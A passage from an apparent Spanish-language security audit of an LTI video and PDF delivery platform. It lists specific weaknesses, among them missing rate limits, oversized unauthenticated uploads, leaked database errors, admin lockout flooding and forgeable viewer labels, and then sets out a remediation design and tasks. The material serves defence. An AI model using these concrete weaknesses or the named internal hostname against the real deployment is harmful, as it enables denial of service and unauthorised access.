coincida. El payload lleva `sub` y `pid`, pero **no se verifican contra nada**.
`src/routes/hls.js:110` no exige sesión —es deliberado, la clave la pide el
reproductor— y tampoco tiene límite de peticiones.

<a id="v-16"></a>
#### V-16 · Los permisos del árbol de medios no cuadran con el uid de nginx

**Verificado** en un volumen Linux real.

`scripts/bootstrap-host.sh:19-30` deja `${DATA}/media` en `drwxr-x--- 1000:1000`.
Los **workers de nginx corren como uid 101**, no como root, así que no tienen ni
permiso de atravesar el directorio:

```
drwxr-x---  1000 1000  /data/media
→ GET /media/videos/…/A/seg_0001.ts?md5=…  →  HTTP 404
[error] open() "/srv/media/…" failed (2: No such file or directory)
```

Consecuencia doble:

- **Funcional**: un host preparado exactamente como dice `infra/test/README.md:54-57`
  no sirve ni un segmento, y en producción no hay red de seguridad porque
  `mediaRouter` no se monta.
- **De seguridad**: como test y producción evidentemente funcionan, alguien
  aflojó los permisos a mano y **no está registrado a qué**. El arreglo intuitivo
  es `chmod -R 755`, que deja `key.bin` —la clave AES de cada revisión— legible
  por cualquier usuario local del host y por cualquier contenedor que monte esa
  ruta. La postura real del directorio que guarda las claves es desconocida y no
  auditable desde el repositorio.

<a id="v-17"></a>
#### V-17 · Sin límites: 4 GB sin autenticar en nginx, sin `limit_req`, sin cuota

**Verificado** empíricamente: `POST /lti/login` de 50 MB **sin ninguna
credencial** → `200`, y el upstream recibió los 50 MB.

- `infra/nginx/templates/default.conf.template:18-19` pone
  `client_max_body_size ${MAX_UPLOAD_SIZE}` en el bloque `server`, así que se
  hereda en **todas** las locations, no sólo en la de subida. En producción son
  **4 GB**. Node limita los cuerpos a 256 kB, pero ese límite se aplica *después*
  de que nginx haya aceptado el cuerpo entero, y `location /` no lleva
  `proxy_request_buffering off`: nginx **bufferiza en disco** antes de proxear. El
  contenedor `proxy` no tiene límite de disco. N conexiones lentas ocupan N×4 GB
  del sistema de ficheros que respalda también `pgdata` y los medios.
- `nginx -T` sobre la configuración renderizada no devuelve **ninguna** directiva
  `limit_req`, `limit_req_zone`, `limit_conn` ni `limit_conn_zone`. `/admin/login`
  y `/lti/login` están accesibles desde Internet sin freno en el edge.
- En la aplicación, el único `rateLimit` está en `src/admin/routes.js:41`.
- La subida **calcula el espacio libre y no lo usa** (`src/routes/videos.js:76-77`,
  `:100`): `freeBytes` sólo se escribe en el log. No hay cuota por profesor ni
  número máximo de materiales. Las únicas cotas son `maxFoldersPerOwner` (100) y
  `maxCollectionItems` (50).
- `receiveVideoUpload` pasa `magic = null` (`src/media/upload.js:215`), así que el
  vídeo se valida sólo por extensión y el tipo real lo rechaza `ffprobe` **después**
  de haber escrito hasta 4 GiB. El PDF sí valida `%PDF-` en streaming.

**Nota documental**: `infra/test/README.md:45` y `docs/https-tunel.md:54`
recomiendan poner `proxy_request_buffering off` en el `location /` **del edge**, es
decir globalmente. El cuidado con que el compose lo restringe a la ruta de subida
se deshace en el proxy de delante.

<a id="v-18"></a>
#### V-18 · El HTML del launch lleva el token embebido y no prohíbe la caché

`src/lti/routes.js:130`, `:228`, `:245` y `:286` responden con
`res.type('html').send(...)` y el `sessionToken` dentro de `{{BOOTSTRAP}}`, sin
fijar `Cache-Control`. Compárese con `src/routes/hls.js:26`, donde la playlist sí
usa `no-store, no-cache, must-revalidate, private`: la incoherencia es el bug.

<a id="v-19"></a>
#### V-19 · La caché de JWKS es por proceso y nunca revalida la URL

`src/lti/jwks-cache.js:3-16`: la entrada del `Map` captura la URL al crearse y no
vuelve a leer la fila. `invalidateJwksCache` sólo actúa sobre el `Map` del proceso
que atendió el cambio. Si el JWKS de una plataforma se ve comprometido —dominio
caducado y recomprado, subdominio tomado— y el administrador cambia `jwks_url`,
**cualquier otra réplica y el worker siguen apuntando a la URL vieja
indefinidamente**; `jose` refresca cada 12 h contra la misma URL antigua. Sólo un
reinicio lo arregla.

Desactivar una plataforma **sí** funciona: `validateLaunch:68-73` relee `enabled`
en cada launch. La URL del JWKS es la única pieza que se cachea sin revalidar.

<a id="v-20"></a>
#### V-20 · Confianza al primer uso en `deployment_id`, sin cota

`src/lti/validate.js:136-147`: `if (known.length > 0 && !known.includes(...))`. La
lista arranca vacía —`deploymentIds` no es obligatorio al dar de alta y la columna
es `DEFAULT '{}'`— así que **el primer `deployment_id` que llegue se acepta y
queda grabado**. La comprobación que el comentario de cabecera anuncia nunca falla
en el caso común, porque el propio launch la rellena. Además `array_append` sin
cota permite crecimiento ilimitado desde una entrada no controlada. Impacto
acotado porque el aislamiento real es por `platform_id`.

<a id="v-21"></a>
#### V-21 · `/readyz` publica el error de base de datos sin autenticación

`src/routes/health.js:27` — `res.status(503).json({ status: 'degraded', error: err.message })`.
Los mensajes de `pg` incluyen host, puerto, nombre de usuario o el motivo del
fallo de autenticación. El endpoint es público.

<a id="v-22"></a>
#### V-22 · `/lti/login` escribe en la base de datos sin autenticar ni limitar

`src/lti/routes.js:36-81`: un `GET /lti/login?iss=<issuer registrado>` inserta una
fila en `lti_oidc_state` sin credencial ni límite. El purgado corre cada 15
minutos y sólo borra filas con `expires_at < now() - 1 hour`, así que la ventana
real de acumulación es de ~100 minutos por fila. Una petición HTTP barata por cada
`INSERT`.

<a id="v-23"></a>
#### V-23 · `infra/local/.env` está versionado y la puerta de secretos del CI no lo cubre

`.gitignore:3` contiene `*.env`, pero `git ls-files infra/local/` muestra
`infra/local/.env` en el índice: fue añadido con `git add -f` y un fichero ya
trackeado sigue siéndolo. `git status` lo muestra como modificado con normalidad y
`git commit -a` lo lleva al commit sin fricción.

La comprobación de higiene del CI —`.github/workflows/ci.yml:81` y
`cd-main.yml:71`— sólo recorre `infra/*/.env.sample`, así que no vería un token
real en `.env`, ni en los `.env.ci`, ni en los `compose.yml`. Hoy no hay fuga
—`CLOUDFLARE_TUNNEL_TOKEN=` está vacío en todo el histórico—, pero un token de
túnel Cloudflare permite publicar el equipo del desarrollador en Internet bajo el
hostname de la cuenta.

---

### Bajos e higiene

<a id="v-24"></a>
**V-24 · Comparaciones sin tiempo constante.** `src/media/signing.js:36`
(`expected === md5`, sólo afecta al modo desarrollo) y `src/lti/routes.js:410,430`
(ya recogido en [V-06](#v-06)). El proyecto tiene helpers en
`src/admin/auth.js:57-61` y `src/session.js:26-29`.

<a id="v-25"></a>
**V-25 · Parámetros sin validar que devuelven 500 en vez de 400.** `folderId` no
pasa por `isUuid` en `src/services/materials.js:56-63`,
`src/services/collections.js:151-157` ni `src/services/folders.js:194-208`, y
`revisionId` tampoco en `src/routes/videos.js:230`. Verificado contra la base de
datos: `?folderId=abc` produce `22P02 invalid input syntax for type uuid` → 500, y
fuera de producción la respuesta incluye el detalle SQL. Alcanza a `/videos`,
`/documents`, `/materials`, `/collections`, a los `PATCH` que mueven material y al
multipart de las subidas. Llama la atención porque `decodeCursor` **sí** valida y
descarta un cursor manipulado limpiamente.

<a id="v-26"></a>
**V-26 · Carrera en la purga manual de una revisión.** `src/routes/materials.js:133-184`
es el único sitio del proyecto que borra ficheros **fuera de transacción y sin
bloqueo de fila**: cada `one()` es su propia transacción implícita. Entre la
comprobación de `active_revision_id` (línea 147) y el `removeRevisionFiles` (línea
181), un `activate` concurrente —otra pestaña, un doble clic— puede activar justo
esa revisión, que toma `FOR UPDATE` sobre el material mientras la purga nunca lo
pide. Resultado: la revisión queda `ready` y activa en la base de datos con sus
segmentos, su clave AES y su poster ya borrados del disco. El material se rompe en
caliente para todos los alumnos. Además viola la convención de `CLAUDE.md`: hay
SQL crudo en la capa de rutas.

<a id="v-27"></a>
**V-27 · Consultas sin cota de filas.** `listViewers`
(`src/services/videos.js:318`), `listDocumentViewers`
(`src/services/documents.js:270`), `listCollections`
(`src/services/collections.js:165`) y `listRevisions`
(`src/services/revisions.js:151`) no llevan `LIMIT`. Un vídeo con 20 000 alumnos
devuelve 20 000 filas con `user_sub`, `user_name` y `user_identity`.

> **Corrección a una sospecha inicial**: los endpoints `/viewers` **no** exponen IP
> ni user-agent. Esas columnas se escriben en `view_event` pero no se leen desde
> ninguna ruta HTTP.

<a id="v-28"></a>
**V-28 · Un solo DTO para el dueño y para el alumno.** `GET /videos/:id` y
`GET /documents/:id` son alcanzables con `requireSession` y devuelven
`toMaterialDto` entero, que incluye `folderId` y `error` —este último relleno con
`String(error?.message)` del pipeline (`src/queue/postgres.js:215`), es decir
stderr de ffmpeg o qpdf con rutas absolutas del contenedor—. **Hoy no es
explotable**, porque `syncMaterialStatus` fuerza `error = NULL` cuando hay revisión
activa y `authorizeResource` deniega si no la hay. Pero la protección es
circunstancial: el DTO no distingue audiencia.

<a id="v-29"></a>
**V-29 · Dos comprobaciones del spec que faltan.** `azp` sólo se valida cuando
`aud` tiene más de un elemento (`src/lti/validate.js:106-114`); OIDC Core §3.1.3.7
pide validarlo siempre que esté presente. Y `target_link_uri` se guarda en la fila
del `state` y se define en `CLAIM.targetLinkUri`, pero **nunca se compara con
nada**.

<a id="v-30"></a>
**V-30 · La etiqueta visible del overlay es forjable por el profesor.**
`src/lti/routes.js:103`: `identity` sale de un parámetro personalizado
(`username`), y en Moodle los parámetros a nivel de actividad los edita el
profesor y tienen precedencia sobre los de la herramienta. Un profesor puede poner
`username=otra_persona` y todos los visionados quedarán marcados con ese nombre.
**El patrón A/B no se ve afectado**: se deriva de `userSub`, que viene del claim
`sub` firmado. Lo que se corrompe es la etiqueta legible, no la trazabilidad
criptográfica.

<a id="v-31"></a>
**V-31 · Robustez.** `claims.js:33` llama `.some()` sobre `roles` sin comprobar que
sea un array (una plataforma que mande `roles` como cadena produce un 500);
`src/security/frame-ancestors.js:13` hace `new URL()` dentro de un `map`, así que
un único `issuer` no parseable congela la lista en silencio para siempre; y
`src/media/run.js:34-38` mata sólo el hijo directo, no el grupo de procesos —hoy
inocuo, mañana no si alguna herramienta forkea—.

<a id="v-32"></a>
**V-32 · `authorizeCollection` no comprueba la propiedad.**
`src/services/authorization.js:86-96`: en modo `catalog`/`manage` devuelve `ok` para
**cualquier** UUID de colección, sin filtrar por `platform_id` ni `owner_sub`. Hoy
no es explotable porque su único llamante (`src/routes/collections.js:151-157`)
vuelve a acotar con `getOwnedCollection`. Pero el fichero se documenta a sí mismo
como «el punto único por el que pasan playlist, clave, PDF, manifest y
metadatos», y para colecciones no lo es. Trampa latente.

<a id="v-33"></a>
**V-33 · Contenedores y cabeceras del proxy sin endurecer.** Verificado sobre el
contenedor real: ningún servicio declara `read_only`, `cap_drop`, `security_opt`
ni `user` (`ReadonlyRootfs=false CapDrop=[] SecurityOpt=[]`). `server_tokens` no
está desactivado, así que cada respuesta —incluidas las de error— publica
`Server: nginx/1.27.5`. Y las respuestas que sirve nginx directamente (segmentos,
403/410/404) salen **sin CSP, sin HSTS y sin `Referrer-Policy`**; el middleware de
`src/app.js:43-71` sólo cubre lo que pasa por Node. Como las configuraciones de
edge documentadas tampoco añaden HSTS, el resultado neto es que **ninguna capa del
despliegue documentado la emite**. `app` y `worker` sí corren como `node`.

<a id="v-34"></a>
**V-34 · La cuenta de administración se puede bloquear inundándola.**
`src/admin/auth.js:114-122` cuenta fallos con `WHERE username=$1 OR ip=$2`. Cinco
intentos con el `ADMIN_USERNAME` real desde cualquier IP bloquean al administrador
15 minutos. Mitigado porque el bootstrap de login no revela el usuario, pero es un
secreto de baja entropía.

<a id="v-35"></a>
**V-35 · Parámetros de scrypt fijos y bajos.** `src/admin/auth.js:13-15` rechaza
cualquier combinación distinta de N=16384, r=8, p=1. N=2^14 está por debajo de la
guía actual (~2^17) y **no se puede subir sin cambiar código**.

<a id="v-36"></a>
**V-36 · Comillas invertidas sin escapar en `release.yml`.**
`.github/workflows/release.yml:149-154` usa backticks dentro de comillas dobles en
`echo "### Producción → \`${VERSION}\`"`. En bash eso es sustitución de comandos:
intenta ejecutar `v0.1.0` como programa. El paso no lleva `set -euo pipefail`, así
que falla en silencio y el resumen sale roto. Lo único que impide que sea inyección
de comandos es la validación por expresión regular de la línea 39 sobre
`inputs.version` — una defensa única para un valor de `workflow_dispatch`.
`cd-main.yml:181` y `cd-promote.yml:116` sí escapan bien; aquí falta.

<a id="v-37"></a>
**V-37 · Deriva entre documentación y código.** `CLAUDE.md` y la documentación
afirman que sin plataformas dadas de alta `frame-ancestors` queda en
`'self' https:`; `src/security/frame-ancestors.js:4,14` deja `'self'`. Sin impacto
—el valor real es más restrictivo—, pero la documentación de este proyecto es su
principal activo y conviene que siga siendo fiable.

---

## 4. Diseño técnico de la solución

### 4.1 La idea de fondo: separar «sesión» de «pase de reproducción»

Hoy hay **un** token que abre todo y que además tiene que viajar en una URL. Esas
dos propiedades juntas son el problema: lo que se puede copiar de la barra de
direcciones es exactamente lo que da acceso a todo.

| | `sessionToken` (existe hoy) | `playbackTicket` (nuevo) |
|---|---|---|
| Qué abre | El alcance del launch (recurso o colección) | Un solo recurso, una sola revisión |
| Cuánto dura | Lo que dure la clase (4 h configurable) | 60–120 segundos |
| Dónde viaja | **Sólo** en `Authorization: Bearer` | En `?pt=`, cuando no hay más remedio |
| Ligado a | La sesión LTI | Además, a la dirección del cliente |
| Se revoca | Sí (tabla de concesiones) | Caduca solo |

`readSessionToken` deja de aceptar `?st=`. El `sessionToken` vive en la memoria del
JavaScript de la página, que lo recibe en `{{BOOTSTRAP}}` como ya hace hoy, y nunca
sale de ahí salvo como cabecera.

### 4.2 El camino de un visionado, revisado

```
1.  Alumno pulsa la actividad en Moodle
2-5. (sin cambios) handshake OIDC → id_token validado → sessionToken
     → HTML del player, ahora con Cache-Control: no-store

6.  player  · ¿Hls.isSupported()?  ← se invierte la preferencia actual
    ├── SÍ (Chrome, Firefox, Edge, Safari ≥17.1 con ManagedMediaSource)
    │   new Hls({ xhrSetup: (xhr) => xhr.setRequestHeader(
    │               'Authorization', `Bearer ${sessionToken}`) })
    │   → playlist, segmentos y clave con cabecera. CERO tokens en URL.
    │
    └── NO (iOS antiguo, HLS nativo obligatorio)
        POST /hls/<id>/ticket  con Authorization: Bearer
        → playbackTicket de 90 s, ligado a la dirección del cliente
        → element.src = `/hls/<id>/index.m3u8?pt=<ticket>`

7.  app     · deriva el patrón y reescribe la playlist (sin cambios)
            · firma cada URL con la dirección del cliente dentro del HMAC
            · TTL de firma: 15-30 min, no 4 h
            · registra el acceso ANTES de responder; si no puede, 503

8.  player  → clave AES (cabecera, o ticket en el caso nativo)
9.  nginx   · secure_link_md5 "$secure_link_expires$uri$remote_addr$secret"
            · firma de otra dirección o caducada → 403

10. player  · un 403 de segmento no es error fatal: pide playlist nueva y
              reanuda en la misma posición
```

Los dos cambios que resuelven el caso reportado son el paso 6 —el token deja de
estar en la URL para la inmensa mayoría de los navegadores— y el paso 9 —una URL
copiada no funciona desde otra red—.

### 4.3 Por qué ligar a la dirección del cliente es asumible

El riesgo evidente es el alumno que cambia de red a mitad de vídeo —del wifi del
centro a datos móviles— y se queda con un 403. Se cubre en el paso 10: `hls.js`
emite `ERROR` con `fragLoadError`, el reproductor pide una playlist nueva con su
`sessionToken` (que sigue en memoria) y reanuda en la posición actual. Es el mismo
mecanismo que ya hace falta para el TTL corto, así que no añade complejidad propia.

Lo que **no** cubre: NAT con salida por varias direcciones (algunas redes
corporativas, CGNAT rotatorio). Por eso el reintento no puede ser silencioso sino
contabilizado: si un `jti` provoca muchas recargas por 403 en poco tiempo, es señal
de una de dos cosas —red inestable o token compartido— y ambas merecen quedar
registradas.

Ojo con [V-13](#v-13): ligar a la dirección **exige** arreglar antes el reenvío de
`X-Forwarded-For`, o el atacante elige la dirección a la que se liga la firma.

### 4.4 Cerrar el aislamiento entre profesores

[V-02](#v-02) no se arregla añadiendo `owner_sub` al `SELECT` del launch: el alumno
que abre la actividad no es el propietario, así que esa condición rompería el caso
normal. Lo que falta es demostrar que **la referencia al material la emitimos
nosotros para ese propietario**.

**Referencia firmada.** Al responder al Deep Linking, junto a `custom.resourceid` y
`custom.resourcekind` se añade
`custom.resourcesig = HMAC(SESSION_SECRET, platform_id | kind | id | owner_sub)`.
Moodle guarda los parámetros personalizados tal cual y los reenvía en cada launch.
Al recibirlos, el launch recalcula la firma con el `owner_sub` que consta en la fila
del material: si no cuadra, 404. Un profesor que escriba el UUID a mano no tiene
forma de producir la firma.

Es apátrida y encaja con el estilo del proyecto, pero **las actividades ya
desplegadas no llevan firma**. De ahí el modo de gracia:

- `LAUNCH_RESOURCE_SIGNATURE=warn` (por defecto al desplegar): un launch sin firma
  se sirve, pero deja un evento con el material, el curso, la actividad y quién
  lanzó. El operador ve la lista de actividades pendientes de regenerar.
- `LAUNCH_RESOURCE_SIGNATURE=enforce`: sin firma válida, 404.

Como defensa complementaria durante la ventana de gracia se registra cada emisión
de Deep Linking en `deep_link_grant (platform_id, kind, resource_id, owner_sub,
created_at)`. Toda actividad **nueva** queda cubierta desde el primer día, y la
tabla sirve para saber cuántas actividades viejas quedan.

### 4.5 Detección de compartición

Es la pieza que hoy no existe y la que convierte «alguien ha compartido el enlace»
de invisible en accionable. Migración `008`:

```sql
CREATE TABLE playback_grant (
  jti              uuid PRIMARY KEY,          -- el jti del sessionToken
  platform_id      uuid NOT NULL REFERENCES lti_platform(id) ON DELETE CASCADE,
  user_sub         text NOT NULL,
  resource_kind    text,
  resource_id      uuid,
  issued_at        timestamptz NOT NULL DEFAULT now(),
  expires_at       timestamptz NOT NULL,
  request_count    integer NOT NULL DEFAULT 0,
  distinct_ips     integer NOT NULL DEFAULT 0,
  distinct_agents  integer NOT NULL DEFAULT 0,
  first_ip         inet,
  last_ip          inet,
  suspicious_at    timestamptz,
  revoked_at       timestamptz,
  revoked_reason   text
);
```

- `verifySession` consulta una caché en memoria de `jti` revocados, refrescada cada
  pocos segundos. Coste por petición: una consulta a un `Set`.
- Cada petición de playlist, clave o contenido incrementa los contadores.
- Umbral configurable (`PLAYBACK_MAX_DISTINCT_IPS`, por defecto 3): al superarlo se
  marca `suspicious_at`, se emite un evento de auditoría y —según
  `PLAYBACK_REVOKE_ON_SUSPICION`— se revoca.
- El catálogo del profesor muestra la señal; la consola de administración permite
  revocar a mano.

Esto conserva intacta la semántica de `view_event` —un candidato forense por
sesión, que es lo que necesita el trazado— y añade al lado el dato operativo que
hoy se pierde.

### 4.6 Decisiones que hay que registrar

Estos cambios tocan decisiones ya tomadas, y eso se escribe en
[`decisiones.md`](decisiones.md), no se entierra en un commit:

- **ADR-016 · El token de sesión no viaja en la URL.** Revisa ADR-003, cuya premisa
  técnica («`hls.js` no puede añadir cabeceras») dejó de ser cierta. Mantiene «nada
  de cookies»; cambia el transporte a cabecera y reserva el parámetro de URL para un
  ticket corto y ligado a la dirección del cliente.
- **ADR-017 · Las firmas de segmento incluyen la dirección del cliente.** Amplía
  ADR-004. Documenta el coste: reintento del reproductor al cambiar de red.
- **ADR-018 · Hay estado de sesión en servidor, sólo para revocar y medir.** Revisa
  la consecuencia de ADR-003 que decía «no se puede revocar una sesión antes de que
  caduque».
- **ADR-019 · La entrega firmada es obligatoria en producción**, y la aplicación no
  delega su única defensa en el proxy.
- **ADR-020 · La referencia al material que guarda Moodle va firmada.** Es lo que
  convierte el invariante de `owner_sub` en algo que el launch puede comprobar.

---

## 5. Tareas

Formato y convenciones de [`tasks/README.md`](tasks/README.md). Numeración a partir
de T23. Cada una lleva criterios de aceptación porque, según la convención del
proyecto, **estar implementada en el recorrido feliz no basta para cerrarla**.

---

### T23 · Sacar el token de sesión de la URL

**Severidad**: crítica · **Cierra**: [V-01](#v-01) · **Fase**: seguridad de entrega

**Objetivo.** Que copiar cualquier URL del reproductor deje de dar acceso al
contenido.

**Diseño**

1. `src/session.js` — `readSessionToken` acepta **sólo** `Authorization: Bearer`. Se
   añade `readPlaybackTicket(req)` para el nuevo `?pt=`.
2. `src/session.js` — `issuePlaybackTicket({ kind, id, revisionId, sub, platformId, ip })`
   y `verifyPlaybackTicket(token, { kind, id, ip })`, con TTL propio
   (`PLAYBACK_TICKET_TTL_SECONDS`, por defecto 90). El payload lleva un hash de la
   dirección, no la dirección.
3. `src/routes/hls.js` — `POST /hls/:id/ticket` con `requireSession` +
   `authorizeResource`. La ruta de la playlist acepta sesión por cabecera **o**
   ticket válido.
4. `src/routes/documents.js` — igual para `/documents/:id/content`.
5. `src/ui/assets/video-component.js` — se invierte la preferencia: si
   `Hls.isSupported()`, se usa `hls.js` con
   `xhrSetup: (xhr) => xhr.setRequestHeader('Authorization', 'Bearer ' + sessionToken)`.
   El HLS nativo queda como respaldo y es el único que pide ticket.

**Piezas que tocar**: `src/session.js`, `src/routes/auth.js`, `src/routes/hls.js`,
`src/routes/documents.js`, `src/routes/collections.js`,
`src/ui/assets/video-component.js`, `src/ui/assets/collection.js`, `.env.example`,
`docs/decisiones.md` (ADR-016), `docs/arquitectura.md`.

**Criterios de aceptación**

- [ ] `GET /hls/<id>/index.m3u8?st=<sessionToken válido>` responde **401**.
- [ ] La misma petición con `Authorization: Bearer` responde 200.
- [ ] En Chrome, la pestaña de red no muestra **ningún** token en ninguna URL
      durante una reproducción completa.
- [ ] Un ticket emitido para una dirección y usado desde otra responde 403.
- [ ] Un ticket usado 91 segundos después de emitirse responde 401.
- [ ] Un ticket de un vídeo no abre otro vídeo ni el PDF de la misma colección.
- [ ] En Safari/iOS con HLS nativo la reproducción funciona con ticket.
- [ ] `curl "…/documents/<id>/content?st=<token>"` responde 401.

**Riesgos.** El HLS nativo de iOS es el camino menos probado. Verificar en
dispositivo real antes de cerrar; entra en la matriz de T11.

---

### T24 · Aislamiento por propietario en el launch

**Severidad**: crítica · **Cierra**: [V-02](#v-02) · **Fase**: seguridad de aplicación

**Objetivo.** Que el invariante que la documentación ya afirma —«`owner_sub` separa
profesores; un UUID ajeno responde 404»— sea cierto también en el launch.

**Diseño**: referencia firmada + modo de gracia, según la sección
[4.4](#44-cerrar-el-aislamiento-entre-profesores). Migración `008` con
`deep_link_grant`. Nueva variable `LAUNCH_RESOURCE_SIGNATURE` (`warn` | `enforce`),
por defecto `warn` en la primera versión y `enforce` en la siguiente.

**Piezas que tocar**: `src/lti/deeplink.js`, `src/lti/routes.js`
(`resourceFromCustom` y `renderMaterialLaunch`), `src/services/platforms.js`,
`migrations/008_*.sql`, `docs/decisiones.md` (ADR-020), `docs/moodle-setup.md`.

**Criterios de aceptación**

- [ ] Una actividad con `resourceid` de otro profesor y sin firma responde **404**
      en modo `enforce` (no 403, que confirmaría la existencia).
- [ ] En modo `warn` esa misma actividad se sirve pero deja un evento con material,
      curso, actividad y usuario.
- [ ] Una actividad insertada por Deep Linking después del despliegue funciona en
      modo `enforce` sin tocarla.
- [ ] Existe una consulta documentada que lista las actividades sin firma pendientes
      de regenerar.

**Riesgos.** Es el cambio con más impacto operativo del plan: hasta que las
actividades viejas se regeneren, `enforce` las rompe. Por eso el modo de gracia y el
inventario previo son parte de la tarea, no un extra.

---

### T25 · Endurecimiento de la infraestructura

**Severidad**: crítica (por [V-03](#v-03) y [V-10](#v-10)) · **Cierra**: [V-03](#v-03), [V-10](#v-10), [V-16](#v-16), [V-17](#v-17) (parte de nginx), [V-23](#v-23), [V-33](#v-33), [V-36](#v-36) · **Fase**: producción

**Objetivo.** Que ninguna instrucción del propio README abra un puerto que no debe,
y que el árbol que guarda las claves AES tenga permisos conocidos y auditables.

**Diseño**

1. **Separar las variables de bind.** `DB_BIND_ADDRESS` distinto de `BIND_ADDRESS`,
   con `127.0.0.1` fijo y un comentario que explique por qué. Corregir
   `infra/test/README.md:49` para que la recomendación no publique la base de datos,
   y añadir la nota sobre `DOCKER-USER` frente a ufw.
2. **Permisos del árbol de medios.** `scripts/bootstrap-host.sh` deja `media` con
   grupo compartido entre el uid de `node` (1000) y el de `nginx` (101):
   `chgrp`/`setgid` y `chmod 2750`, con `key.bin` en `0640`. El script comprueba al
   final que el uid 101 puede leer un segmento y falla si no.
3. **Comprobar la exposición del entorno local.** Sacar `infra/local/.env` del índice
   de git (`git rm --cached`), sustituir el `PUBLIC_URL` real por un marcador, y
   ampliar la puerta de secretos del CI a `.env`, `.env.ci` y `compose.yml`.
4. **Límites en nginx.** `client_max_body_size` baja a un valor pequeño en el bloque
   `server` y sube sólo dentro de la `location` de subida. `limit_req_zone` y
   `limit_conn_zone` para `/admin/login`, `/lti/login` y `/lti/platforms`.
5. **Cabeceras y endurecimiento.** `server_tokens off`; CSP, HSTS y `Referrer-Policy`
   también en las respuestas que sirve nginx; `read_only`, `cap_drop: [ALL]` con las
   capacidades mínimas, `security_opt: [no-new-privileges:true]` en los cuatro
   servicios; imagen de nginx fijada por digest.
6. `.github/workflows/release.yml:149-154` — escapar las comillas invertidas y añadir
   `set -euo pipefail`.

**Criterios de aceptación**

- [ ] Con `BIND_ADDRESS=0.0.0.0`, `docker compose ps` muestra el proxy en `0.0.0.0` y
      Postgres en `127.0.0.1`.
- [ ] Un host preparado con `bootstrap-host.sh` recién ejecutado sirve un segmento
      firmado sin tocar nada a mano.
- [ ] `key.bin` no es legible por otro usuario del host.
- [ ] `git ls-files infra/` no devuelve ningún `.env`.
- [ ] La puerta de secretos del CI falla si se añade un valor con entropía alta a
      cualquier fichero de `infra/`.
- [ ] `POST /lti/login` con `Content-Length: 4294967296` se rechaza en nginx con 413.
- [ ] 20 intentos seguidos contra `/admin/login` desde la misma dirección reciben 429
      **en nginx**, sin llegar a la aplicación.
- [ ] `curl -I` sobre un segmento devuelve CSP, HSTS y `Referrer-Policy`, y no
      devuelve `Server: nginx/x.y.z`.

**Acción previa, hoy**: comprobar si `epesmadw0156.tail97d662.ts.net` responde desde
fuera del tailnet. Si responde, bajar el Funnel antes que nada.

---

### T26 · Cerrar la entrega de segmentos sin firma

**Severidad**: alta · **Cierra**: [V-11](#v-11), [V-12](#v-12), [V-24](#v-24) · **Fase**: seguridad de entrega

**Objetivo.** Que la aplicación no dependa del proxy para no servir segmentos sin
firma, y que una URL firmada no funcione desde otra máquina.

**Diseño**

1. `src/config.js` — `assertConfigValid()` exige, en producción, que
   `MEDIA_DELIVERY` sea `signed`. El proceso muere al arrancar si no.
2. `src/app.js:88` — el montaje pasa a `if (!config.isProduction)`. En producción la
   ruta no existe, punto.
3. `src/media/signing.js` — la firma incorpora la dirección del cliente:
   `md5(expires + uri + remoteAddr + secret)`. `verifyMediaUrl` usa `timingSafeEqual`.
4. `infra/*/nginx` — `secure_link_md5 "$secure_link_expires$uri$remote_addr$secret";`
   conservando la comprobación actual de `""` y `"0"`, que ya es correcta.
5. `src/media/playlist.js` — recibe la dirección del cliente y firma con ella. TTL de
   enlace por defecto a 1800 s.
6. `src/ui/assets/video-component.js` — un `fragLoadError` con 403 pide playlist nueva
   y reanuda en `element.currentTime`, en vez de tratarse como error de red.
7. `.env.example` — `MEDIA_DELIVERY=signed` documentado, con nota de que `app` es sólo
   para desarrollo sin proxy.

**Depende de**: el saneado de `X-Forwarded-For` de T25/T29. Firmar con una dirección
que el cliente controla no protege de nada.

**Criterios de aceptación**

- [ ] Arrancar con `NODE_ENV=production` y `MEDIA_DELIVERY=app` falla con un mensaje
      que nombra la variable.
- [ ] En producción, un segmento sin firma responde 404 desde la aplicación (la ruta
      no está montada) y 403 desde nginx.
- [ ] Una URL firmada para la dirección A responde 403 desde la B.
- [ ] Una URL con `expires` vencido sigue respondiendo 410, y un `md5` manipulado 403.
- [ ] Cambiar de red a mitad de reproducción recupera en menos de 3 s sin volver al
      inicio.
- [ ] La prueba que compara la firma de Node con la que acepta nginx sigue pasando con
      la dirección incluida.

**Riesgos.** El cambio de firma invalida las URLs ya emitidas. Como el traslado de
T21, conviene desplegarlo en ventana sin visionados activos.

---

### T27 · Higiene de secretos en los registros

**Severidad**: alta · **Cierra**: [V-04](#v-04) · **Fase**: observabilidad

**Diseño**

1. `src/logger.js` — serializador propio de `req` que reescribe `url` quitando el
   query string, o sustituyendo el valor de los parámetros sensibles por `[oculto]`.
   La lista de `redact` se conserva pero deja de ser la única defensa.
2. `infra/nginx/templates/default.conf.template:21` — `log_format` propio sin
   `$query_string`, usando `$uri` en vez de `$request`.
3. Barrido de `logger.debug/info/warn` buscando otros puntos donde se registre una
   URL completa o un payload con token.

**Criterios de aceptación**

- [ ] Una prueba automática arranca la aplicación, hace una petición con
      `?st=MARCA_UNICA` y comprueba que `MARCA_UNICA` **no** aparece en la salida.
- [ ] Lo mismo para `?kt=` y `?md5=`.
- [ ] Los logs de acceso de nginx de una reproducción completa no contienen ninguna
      cadena de más de 40 caracteres en base64url.
- [ ] La ruta y el código de estado siguen siendo legibles para diagnosticar.

---

### T28 · Roles y alta de plataformas

**Severidad**: alta · **Cierra**: [V-05](#v-05), [V-06](#v-06), [V-20](#v-20), [V-29](#v-29), [V-35](#v-35) · **Fase**: seguridad de aplicación

**Diseño**

1. `src/lti/claims.js` — se elimina el respaldo por expresión regular.
   `hasInstructorRole` compara contra la lista blanca y nada más. Si hace falta
   admitir `TeachingAssistant`, se añade su URI completa y se documenta.
2. `src/lti/routes.js` — `POST /lti/platforms` deja de ser un *upsert*: crear una
   plataforma que ya existe responde **409**. Actualizar exige `PUT`/`PATCH` explícito.
   Toda operación escribe en `admin_audit_event`.
3. `src/lti/routes.js` — comparación del bearer con `timingSafeEqual` sobre digests.
   `assertConfigValid` exige `LTI_ADMIN_TOKEN` de al menos 32 caracteres cuando esté
   definido.
4. `src/lti/validate.js` — `deployment_id` deja de ser confianza al primer uso. `azp`
   se valida siempre que esté presente. `target_link_uri` se compara con el endpoint
   de launch.
5. `src/admin/auth.js` — los parámetros de scrypt se leen del hash con un mínimo
   configurable, para poder subir el coste sin cambiar código.

**Criterios de aceptación**

- [ ] Un `id_token` con `roles: ["…/membership/Learner#Instructor"]` produce una sesión
      con `isInstructor = false`.
- [ ] Lo mismo con `…/institution/person#Instructor`.
